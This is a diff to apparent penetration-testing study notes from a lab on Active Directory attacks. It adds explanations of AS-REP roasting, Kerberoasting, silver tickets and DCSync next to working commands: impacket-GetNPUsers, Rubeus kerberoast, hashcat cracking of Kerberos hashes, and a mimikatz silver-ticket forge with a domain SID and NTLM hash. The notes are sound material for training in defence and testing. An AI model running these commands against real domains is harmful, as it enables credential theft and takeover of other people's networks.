@@ -106,6 +106,9 @@ crackmapexec smb 192.168.214.70-192.168.214.76 -u pete -p 'Nexus123!' -d corp.co
 - if auth is successful, the domain controller replies with an AS-REP containing the session key and TGT
 - if no kerberos we can send AS-REP to DC on behalf of any user and do an offline password attack
 - you can achieve this by disabling kerberos preauth
+- can identify these users with bloodhound or powerview
+- the IP here needs to be the IP of the domain controller and a user that can authenticate against it
+
 ```
 impacket-GetNPUsers -dc-ip 192.168.214.70  -request -outputfile hashes.asreproast corp.com/pete
 ```
@@ -149,7 +152,8 @@ sudo hashcat -m 18200 hashes.asreproast3 /usr/share/wordlists/rockyou.txt -r /us
 cd C:\Tools
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
-copy hashes to kali 
+
+- copy hashes to kali and determine what mode for hashcat to use before attempting to crack it
 ```
 hashcat --help | grep -i "Kerberos"
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
@@ -168,9 +172,12 @@ sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r rul
 
 ### Silver tickets
 - we are going to forge our own service tickets
+- need to use a service account such as iis_service
+- the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.
 - if PAC (Privileged Attribute Certificate) is enabled, the user authenticating to the service and its privileges are validated by the domain controller
 - most services do not have this enabled
 - need SPN password hash, Domain SID and Target SPN to create a silver ticket
+- allows us to login to a service as an admin  user, when we don't have their password or hash
 
 note we currently cannot access
 ```
@@ -195,6 +202,7 @@ whoami /user
 ```
 
 create ticket (in mimikatz)
+- We need to provide the domain SID (**/sid:**), domain name (**/domain:**), and the target where the SPN runs (**/target:**). We also need to include the SPN protocol (**/service:**), NTLM hash of the SPN (**/rc4:**), and the **/ptt** option, which allows us to inject the forged ticket into the memory of the machine we execute the command on
 ```
 kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
 ```
@@ -211,7 +219,9 @@ more outfile.txt | findstr /i OS{
 ```
 
 ### domain controller synchronization
+- there may be multiple controllers for redundancy
 - the domain controller receiving a request for an update does not check whether the request came from a known domain controller
+- can launch a dsync attack where we pretend to be a domain controller
 - to launch rogue update request user needs Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights
 - 
 ```
